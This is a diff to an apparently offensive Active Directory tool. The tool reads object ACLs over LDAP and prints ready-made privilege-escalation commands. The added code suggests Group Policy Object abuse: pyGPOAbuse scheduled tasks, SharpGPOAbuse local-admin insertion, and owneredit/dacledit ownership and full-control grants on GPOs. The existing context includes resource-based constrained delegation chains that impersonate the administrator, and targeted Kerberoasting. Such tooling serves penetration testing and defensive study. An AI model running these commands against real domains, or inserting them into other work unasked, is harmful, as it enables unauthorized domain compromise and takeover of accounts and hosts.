@@ -143,6 +143,10 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
         elif obj_type == "group":
             hints.append(("Give genericall rights on group", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add genericAll {target} {current_user}"))
             hints.append(("Add group itself", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add groupMember {target} {current_user}"))
+        elif obj_type == "gpo":
+            hints.append(("GPO Abuse - Immediate Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -localadmin -dc-ip {dc_ip}"))
+            hints.append(("SharpGPOAbuse", f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {current_user} --GPOName \"{target}\""))
     elif "Generic Write" in right or "GenericWrite" in right:
         if obj_type == "user":
             hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'"))
@@ -152,6 +156,10 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("RBCD Step 1: Add Computer", f"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM2$' -computer-pass 'Summer2019!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'"))
             hints.append(("RBCD Step 2: Write Delegation", f"rbcd.py -delegate-from 'ATTACKERSYSTEM2$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'"))
             hints.append(("RBCD Step 3: Get Service Ticket", f"getST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM2$:Summer2019!'"))
+        elif obj_type == "gpo":
+            hints.append(("GPO Abuse - Immediate Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -localadmin -dc-ip {dc_ip}"))
+            hints.append(("SharpGPOAbuse", f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {current_user} --GPOName \"{target}\""))
         #elif obj_type == "group":
             #hints.append(("Add Member to Group (GenericWrite)", f"impacket-net group '{target}' {current_user} -add -domain -dc-ip {dc_ip}"))
     elif "ReadGmsaPassword" in right:
@@ -178,6 +186,10 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("Grant GenericAll", f"{bloody_base} add genericAll {target} {current_user}"))
             hints.append(("Add Member to Group", f"{bloody_base} add groupMember {target} {current_user}"))
+        elif obj_type == "gpo":
+            hints.append(("WriteDACL on GPO - Grant GenericAll", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
+            hints.append(("Then GPO Abuse - Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
+            hints.append(("Then GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -localadmin -dc-ip {dc_ip}"))
     elif "Write Owner" in right or "WriteOwner" in right:
         if obj_type == "user":
             hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
@@ -192,6 +204,10 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("RBCD (Step 3)", f"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM3$' -computer-pass 'Summer2020!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'\nrbcd.py -delegate-from 'ATTACKERSYSTEM3$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'\ngetST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM3$:Summer2020!'"))
             bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("bloodyAD path", f"{bloody_base} set owner {target} {current_user}\n{bloody_base} add genericAll {target} {current_user}\n# If successful, proceed with RBCD escalation (Step 3 above)"))
+        elif obj_type == "gpo":
+            hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target '{target}' '{domain}/{current_user}:{current_auth}'"))
+            hints.append(("Grant FullControl (Step 2)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
+            hints.append(("GPO Abuse (Step 3)", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
         else:
             hints.append(("Take Ownership", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
 
@@ -266,11 +282,11 @@ def main(args=None):
         all_victim_sids[sid] = f"{name} (group)"
     #user_filter = '(&(objectClass=person)(objectClass=user))'
     controls = [('1.2.840.113556.1.4.801', True, b'\x30\x03\x02\x01\x07')]
-    principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount)(objectClass=organizationalUnit))'
+    principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
-    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership'], controls=controls)
+    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership', 'displayName', 'gPCFileSysPath'], controls=controls)
     #if not conn.entries:
         #print(f"[-] Could not find: {target_user}")
         #exit()
@@ -284,9 +300,11 @@ def main(args=None):
     found = False # never delete this!!!!!!!!!!!!!!!!
 
     for entry in conn.entries:
-        if not entry.sAMAccountName:
+        target_name = str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') and str(entry.sAMAccountName) else None
+        if not target_name and hasattr(entry, 'displayName') and str(entry.displayName):
+            target_name = str(entry.displayName)
+        if not target_name:
             continue
-        target_name = str(entry.sAMAccountName)
         if target_name.lower() == args.username.lower():
             continue
             
@@ -302,6 +320,8 @@ def main(args=None):
             obj_type = "group"
         elif "organizationalUnit" in obj_classes:
             obj_type = "ou"
+        elif "groupPolicyContainer" in obj_classes:
+            obj_type = "gpo"
         
         target_fqdn = str(entry.dNSHostName) if hasattr(entry, 'dNSHostName') else target_name
         if target_fqdn.endswith('$'):
